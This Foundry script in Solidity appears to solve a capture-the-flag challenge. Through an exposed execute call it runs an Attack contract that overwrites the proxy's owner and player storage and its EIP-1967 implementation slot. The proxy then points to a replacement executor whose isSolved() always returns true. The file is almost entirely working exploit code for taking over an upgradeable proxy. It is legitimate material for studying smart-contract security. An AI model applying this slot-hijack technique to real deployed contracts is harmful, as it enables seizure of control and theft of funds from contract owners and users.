// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Proxy, Executor} from "../src/Proxy.sol";
import "@openzeppelin-contracts-4.8.0/contracts/proxy/utils/Initializable.sol";


contract ProxySolve is Script {
    Proxy public proxy = Proxy(payable(0x09FAb0F0CC143875873F111A27DF77B6ade37a20));
    Executor public executor = Executor(address(proxy));
    address player = vm.envAddress("PLAYER");

    // Deploy
    // function setUp() external{
    //     executor = new Executor();
    //     proxy = new Proxy(address(executor), player);
    //     executor = Executor(address(proxy));

    //     vm.deal(player, 1 ether);
    // }
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Proxy : ", address(proxy));
        bytes32 logic = vm.load(address(proxy), bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
        console.log("logic in Proxy", address(uint160(uint256(logic))));
        console.log("Proxy Owner: ", executor.owner());
        console.log("Player in Proxy: ", executor.player());
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        console.log("isSolved(): ", executor.isSolved());
        NewExecutor newExecutor = new NewExecutor();
        Attack attack = new Attack(address(address(newExecutor)), player);
        executor.execute(address(attack));
        console.log("Attack : ", address(attack));
        console.log("NewExecutor : ", address(newExecutor));
        logic = vm.load(address(proxy), bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
        console.log("logic in Proxy", address(uint160(uint256(logic))));
        // executor.initialize(player);
        console.log("Proxy Owner: ", executor.owner());
        console.log("Player in Proxy: ", executor.player());
        console.log("isSolved(): ", executor.isSolved());
        vm.stopBroadcast();
    }
}


contract Attack {
    struct AddressSlot {
        address value;
    }
    address public owner;
    address public player;
    address immutable newExecutor;
    address immutable playerplayer;
    constructor(address _newExecutor, address _player){
        newExecutor = _newExecutor;
        playerplayer = _player;
    }
    function exec() external {
        owner = address(0xdeadbeef);
        player = playerplayer;
        _getAddressSlot(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc).value = newExecutor;
    }
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }
}

contract NewExecutor is Initializable{
    address public owner;
    address public player;
    function initialize(address _player) external initializer {
        owner = msg.sender;
        player = _player;
    }
    function isSolved() external pure returns (bool) {
        return true;
    }
}